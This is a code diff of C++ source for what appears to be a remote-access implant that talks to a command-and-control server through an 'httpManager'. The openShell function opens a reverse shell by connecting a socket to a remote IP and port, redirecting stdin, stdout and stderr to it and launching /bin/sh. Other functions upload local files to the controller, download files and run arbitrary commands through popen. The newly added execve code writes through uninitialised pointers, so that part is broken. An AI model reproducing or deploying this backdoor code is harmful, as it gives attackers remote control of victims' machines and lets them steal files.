@@ -17,18 +17,18 @@
 using namespace std;
 
 void 
-openShell(commandInput cmd,httpManager &manager)
+openShell(vector<string> cmd,httpManager &manager)
 {
     struct sockaddr_in sa;
     int s;
-    unsigned port = std::stoul (cmd.argv[1]);
+    unsigned port = std::stoul (cmd[1]);
     pid_t pid_fork;
     string response;
     int status;
 
     cout << "running shell." << endl;
     sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(cmd.argv[0].c_str());
+    sa.sin_addr.s_addr = inet_addr(cmd[0].c_str());
     sa.sin_port = htons(port);
     
     pid_fork=fork();
@@ -41,7 +41,15 @@ openShell(commandInput cmd,httpManager &manager)
                 dup2(s, 2);
 
                 cout << "starting bash" << endl;
-                execve("/bin/sh", 0, 0);
+                
+                char ** envp;
+                envp[0]=(char *)string(".").c_str();
+                envp[1]=nullptr;
+
+                char ** argv;
+                argv[0] = nullptr;
+
+                execve("/bin/sh", argv, envp);
                 //no return
             }
         }
@@ -54,38 +62,38 @@ openShell(commandInput cmd,httpManager &manager)
         waitpid(pid_fork,&status,0 );
         //https://linux.die.net/man/2/waitpid
         if (WIFEXITED(status)){
-            //printf("Exited Normally\n");
+            printf("Exited Normally\n");
         }
     }
     
 }
 
-void sendfile(commandInput cmd,httpManager &manager)
+void sendfile(vector <string> cmd,httpManager &manager)
 {
     cout << "sending file "<<endl;
-    manager.upload(cmd.argv[0].c_str());
+    manager.upload(cmd[0].c_str());
     manager.report("file upload");
 }
 
-void writefile(commandInput cmd,httpManager &manager)
+void writefile(vector <string> cmd,httpManager &manager)
 {
-    cout << "file downloaded." << cmd.argv[0] << endl;
-    manager.download(cmd.argv[0].c_str());
+    cout << "file downloaded." << cmd[0] << endl;
+    manager.download(cmd[0].c_str());
     //manager.report("file have been moved");
 }
 
-void execute(commandInput cmd,httpManager &manager)
+void execute(vector <string> cmd,httpManager &manager)
 {
     cout << "not implemented." << endl;
     //manager.report("not implemented yet");
 }
 
-void run(commandInput cmd,httpManager &manager)
+void run(vector <string> cmd,httpManager &manager)
 {
     char buffer[128];
     cout <<"running cmd" << endl;
     std::string result = "";
-    FILE* pipe = popen(cmd.argv[0].c_str(), "r");
+    FILE* pipe = popen(cmd[0].c_str(), "r");
     if (!pipe) throw std::runtime_error("popen() failed!");
     try {
         while (fgets(buffer, sizeof buffer, pipe) != NULL) {
@@ -102,9 +110,7 @@ void run(commandInput cmd,httpManager &manager)
 }
 
 void 
-isOK(commandInput cmd,httpManager &manager)
+isOK(httpManager &manager)
 {
-    cout << "running cmd:" << " isOK" << endl;
-    cout << "pesquisar retorno" << endl;
-
+    manager.clientOK();
 }
